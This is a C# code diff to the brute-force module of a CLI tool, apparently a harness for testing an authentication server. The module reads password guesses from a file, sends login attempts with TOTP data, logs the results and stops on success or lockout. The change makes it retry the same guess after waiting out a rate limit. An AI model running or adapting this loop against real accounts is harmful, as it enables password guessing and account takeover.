@@ -36,6 +36,7 @@ namespace IronGate.Cli {
             var maxHttpAttempts = Defaults.DefaultLimit;
             var maxRunTime = TimeSpan.FromSeconds(Defaults.TimeLimitSeconds);
             var rateLimit = false;
+            string? lastCandidate = null;
             globalHttpAttempts = 0;
 
             // We try to get the totpsecret + group seed if it exists for this user
@@ -48,7 +49,6 @@ namespace IronGate.Cli {
             var logPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "brute_force_log.jsonl");
             using var log = new StreamWriter(logPath, append: true, Encoding.UTF8);
 
-            // Print the beginning of the attack TODO: Move this to printers
             Console.WriteLine($"Attack: Brute Force, User: {username}");
             Console.WriteLine($"Stop Conditions: Success/Locked/Runtime({maxRunTime.TotalSeconds}s)/HttpAttempts({maxHttpAttempts})");
             Console.WriteLine($"Log:  {logPath}");
@@ -71,7 +71,6 @@ namespace IronGate.Cli {
 
 
                 while (!streamReader.EndOfStream && !cancelSource.IsCancellationRequested) {
-                    globalHttpAttempts++;
 
                     if (started.Elapsed > maxRunTime) {
                         Console.WriteLine("Stopped: Runtime limit reached.");
@@ -83,60 +82,63 @@ namespace IronGate.Cli {
                         return;
                     }
 
-                    // We get a password candidate from the file, only if we did not hit a rate limit. If we did, we try again with some one!
-                    string candidate = "";
+                    string candidate;
+
                     if (!rateLimit) {
                         candidate = await streamReader.ReadLineAsync().ConfigureAwait(false);
-                        if (candidate == null) break;
+                        if (candidate is null) break;
+
+                        candidate = candidate.Trim();
+                        if (candidate.Length == 0) continue;
+
+                        lastCandidate = candidate;
+                    } else {
+                        // retry the same candidate after waiting
+                        if (lastCandidate is null) {
+                            rateLimit = false;
+                            continue;
+                        }
+                        candidate = lastCandidate;
                     }
+                    globalHttpAttempts++;
 
-                    candidate = candidate.Trim();
-                    if (candidate.Length == 0) continue;
-
-                    // New basic login action array
                     var args = new[] { "login", username, candidate, "-", "-" };
                     var currentMs = Stopwatch.StartNew();
 
-                    // Send the login action, and log afterwords
                     var (printHelp, resp) = await Login.LoginAction(http, args, groupSeed, totpSec).ConfigureAwait(false);
                     if (resp is not null) Printers.Log(globalHttpAttempts, log, username, candidate, resp, "brute-force");
-                    
-                    // Calculate the MS (for average MS)
+
                     currentMs.Stop();
                     totalRequestMs += currentMs.ElapsedMilliseconds;
 
-
-                    // Variables that will hold the result status
                     AuthResultCode? resultCode = null;
                     bool success = false;
+
                     if (resp != null && HttpUtil.TryReadAuthAttempt(resp, out var attempt)) {
                         resultCode = attempt!.Result;
                         success = attempt.Success;
                     }
 
-                    // If we got a rate limit, we just wait the time from the config request
                     if (resultCode == AuthResultCode.RateLimited) {
-                        if (waitTime.HasValue && waitTime.Value > 0) {
-                            Console.WriteLine($"Rate limit hit! Waiting for {waitTime.Value} seconds");
+                        if (waitTime.GetValueOrDefault() > 0) {
+                            Console.WriteLine($"Rate limit hit! Waiting for {waitTime!.Value} seconds");
                             await Task.Delay(TimeSpan.FromSeconds(waitTime.Value), cancelSource.Token).ConfigureAwait(false);
-                            rateLimit = true;
                         }
-
-                        continue;
+                        rateLimit = true;   
+                    }else {
+                        rateLimit = false;
                     }
 
                     if (resultCode == AuthResultCode.LockedOut) {
                         Console.WriteLine("Account got locked! Need to wait for admin to unlock OR password reset!");
                         return;
                     }
+
                     if (success) {
                         Console.WriteLine("Success! We successfuly brute forced into an account!");
                         return;
                     }
-
                 }
-
-                Console.WriteLine("We hit our default cap or finished our file!!");
             }finally {
                 averageMsPerRequest = (double)totalRequestMs / globalHttpAttempts;
                 Printers.WriteJsonl(log, new {
